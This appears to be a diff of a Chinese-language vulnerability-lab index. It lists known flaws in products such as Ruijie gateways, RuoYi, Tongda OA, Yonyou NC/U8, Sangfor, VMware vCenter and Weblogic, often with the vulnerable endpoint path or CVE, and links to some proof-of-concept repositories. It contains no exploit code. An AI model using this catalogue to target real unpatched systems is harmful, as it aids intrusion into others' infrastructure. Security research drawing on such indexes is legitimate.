+- 锐捷EG易网关 远程命令执行-cli.php
+- 锐捷EG易网关 后台任意文件读取-download.php
 
-#### Ruijie-锐捷
-- RG-EG系列(锐捷-EWEB网管系统命令注入-/guest_auth/guestIsUp.php) `2021-01`
-- CNVD-2021-14536(RG-UAC统一上网行为管理审计系统信息泄露漏洞)
-- 锐捷EG易网关 branch_passw.php 远程命令执行漏洞
-- 锐捷EG易网关 cli.php 远程命令执行漏洞
-- 锐捷EG易网关 download.php 后台任意文件读取漏洞
+#### 偌依
+- RuoYi 后台模板注入
+- RuoYi <= v4.6.2 (后台)反序列化-snakeyaml
+- RuoYi <= v4.6.1 (后台)SQL注入-/system/role/list
+- RuoYi <= v4.5.0 (后台)文件下载-/common/download/resource
+- RuoYi <= v4.4.0 Shiro权限认证绕过
+- RuoYi <= v4.3.0 Shiro反序列化
+- RuoYi <= v4.3.0 Shiro权限认证绕过
+- RuoYi <= v3.2.0 SQL注入
 
-#### RuoYi-偌依
-- RuoYi 后台模板注入漏洞
-- RuoYi <= v4.6.2 (后台)反序列化漏洞-snakeyaml
-- RuoYi <= v4.6.1 (后台)SQL注入漏洞-/system/role/list
-- RuoYi <= v4.5.0 (后台)任意文件下载漏洞-/common/download/resource
-- RuoYi <= v4.4.0 Shiro权限认证绕过漏洞
-- RuoYi <= v4.3.0 Shiro反序列化漏洞
-- RuoYi <= v4.3.0 Shiro权限认证绕过漏洞
-- RuoYi <= v3.2.0 SQL注入漏洞
-#### SpiderFlow
-> https://www.spiderflow.org/
-> 
-> https://github.com/ssssssss-team/spider-flow
-- SpiderFlow RCE via Nashorn
-#### Spring
-- CVE-xxxx-xxxx SpringBoot Actuator未授权访问漏洞
-- CVE-2018-1271 Spring MVC目录穿越/遍历漏洞
-- CVE-2019-3799 Spring Cloud Config Server 路径穿越/任意文件读取漏洞
-- CVE-2020-5405 Spring Cloud Config Server路径遍历漏洞
-- CVE-2020-5410 Spring Cloud Config目录穿越/遍历漏洞
-- CVE-2020-5412 Spring Cloud Netflix Hystrix Dashboard SSRF漏洞-proxy.stream
-- CVE-2021-21234 Spring Boot Actuator Logview Directory Traversal
+#### 通达OA
+- 通达OA v11.9 前台SQL注入-get_datas.php
+- 通达OA 文件删除+文件上传=RCE
+- 通达OA 文件上传+文件包含=RCE
+- 通达OA <vv11.5版本 任意用户登录
+- 通达OA v11.2 后台RCE
+- 通达OA v11.7 后台SQL注入
+- 通达OA v11.7 RCE
+- 通达OA v11.8 后台低权限Getshell
 
-#### Thinkadmin
-- CVE-2020-25540(目录遍历/任意文件读取漏洞)
-- CNVD-2020-33163
+#### 天擎
+- 360天擎 SQL注入 
+- 360天擎 信息泄露 
 
-#### ThinkPHP 3.x
-- ThinkPHP3.2.x RCE(文件包含->RCE)
+#### 用友
+- 用友人力资源管理软件（e-HR）XXE
+- 用友NC v5.7 XSS
+- 用友ERP-NC 文件读取-hrss/ELTextFile.load.d
+- 用友NC 文件包含-NCFindWeb
+- 用友NC XSS
+- 用友TurboCRM 文件读取-/ajax/getemaildata.php 
+- 用友UA-PWS XXE
+- 用友FE SQL注入-addUser.jsp 
+- 用友FE SQL注入-codeMoreWidget.jsp 
+- 用友ICC 文件下载-getfile.jsp  
+- 用友ICC XSS 
+- 用友NC-IUFO系统 XSS 
+- 用友TruboCRM SQL注入-/background/
+- 用友TruboCRM SQL注入-/login/forgetpswd.php
+- 用友GRP-U8 SQL注入(CNVD-2020-49261)
+- 用友NC bsh.servlet.BshServlet 远程命令执行
+- 用友GRP-U8 SQL注入 
+- 用友NCCloud-FS SQL注入 
+- 用友U8 OA test.jsp SQL注入 
+- 用友NC v6.5 文件上传-FileReceiveServlet 
 
-#### T-360天擎
-- 360天擎 SQL注入漏洞 `2021-05`
-- 360天擎 数据库信息泄露漏洞 `2021-05`
-
-#### Typecho
-- Typecho v1.0 SSRF漏洞- xmlrpc `2021-01-11`
-- CVE-2018-18753(Typecho v1.1 反序列化漏洞-install.php)
-
-#### VMware
-- VMware vCenter 远程命令执行漏洞(CVE-2021-21972)
-- VMware vRealize Operations Manager SSRF(CVE-2021-21975) 
-- VMware vCenter 远程代码执行漏洞(CVE-2021-21985-回显） 
-- VMware vCenter 任意文件读取漏洞-/eam/vib?id=
-- VMware vCenter Server 文件上传漏洞（CVE-2021-22005）
-- VMware vCenter SSRF/任意文件读取漏洞-/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=
-- VMware View Planner 远程代码执行漏洞（CVE-2021-21978）
-- Vmware Product RCE via Log4Shell
-  - 📌 [Vm4J](https://github.com/NS-Sp4ce/Vm4J)
-
-#### Weblogic
-- [CVE-2020-14882/CVE-2020-14883 权限绕过+ 命令执行 = RCE](https://blog.xray.cool/post/cve-2020-14882&&cve-2020-14883/)
-- CVE-2020-14750 权限绕过
-- [CVE-2022-21350 反序列化](https://mp.weixin.qq.com/s/fFx1kQVfotbOqHlSjSJVMQ)
-
-#### [Yonyou-用友](https://github.com/pen4uin/vulnerability-lab/blob/main/demo/Yonyou.md)
-- 用友人力资源管理软件（e-HR）XXE漏洞
-- 用友 FE协作办公平台1.0信息泄露漏洞
-- 用友 NC 5.7 跨站脚本漏洞
-- 用友 ERP-NC hrss/ELTextFile.load.d 文件读取
-- 用友 NC本地文件包含漏洞-NCFindWeb
-- 用友 NC财务系统跨站脚本漏洞
-- 用友 TurboCRM /ajax/getemaildata.php 任意文件读取漏洞
-- 用友 UA-PWS XXE漏洞
-- 用友 FE协作办公系统 addUser.jsp SQL注入漏洞 `2021-02`
-- 用友 FE协作办公系统 codeMoreWidget.jsp SQL注入漏洞 `2021-02`
-- 用友 ICC客服系统 getfile.jsp 任意文件下载漏洞 `2021-02`
-- 用友 ICC客服系统跨站脚本漏洞 `2021-02`
-- 用友 NC-IUFO系统跨站脚本漏洞 `2021-02`
-- 用友 TruboCRM管理系统 /background/ 三处SQL注入漏洞 `2021-02`
-- 用友 TruboCRM管理系统 /login/forgetpswd.php SQL注入漏洞 `2021-02`
-- CNVD-2020-49261(用友GRP-U8 SQL注入漏洞)
-- 用友 NC bsh.servlet.BshServlet 远程命令执行漏洞 
-  - 📌 [NC-BeanShell-RCE](https://github.com/z1un/NC-BeanShell-RCE)
-- 用友GRP-U8 SQL注入漏洞 `2021-05`
-- 用友 NCCloud FS文件管理SQL注入漏洞 `2021-05`
-- 用友 U8 OA test.jsp SQL注入漏洞 `2021-05`
-- 用友 NC6.5 任意文件上传漏洞-FileReceiveServlet 
-- 用友 NC 反序列化漏洞
-
-
-
-
-###### Reference
-- https://mp.weixin.qq.com/s/VGMxrw8HD2ZbQHpyL-V_nQ
-
+#### 深信服
+- 深信服 SSL VPN url 命令注入(CNVD-2020-57240)
+- 深信服 EDR终端检测响应平台 任意用户登录
+- 深信服 EDR终端检测响应平台 RCE
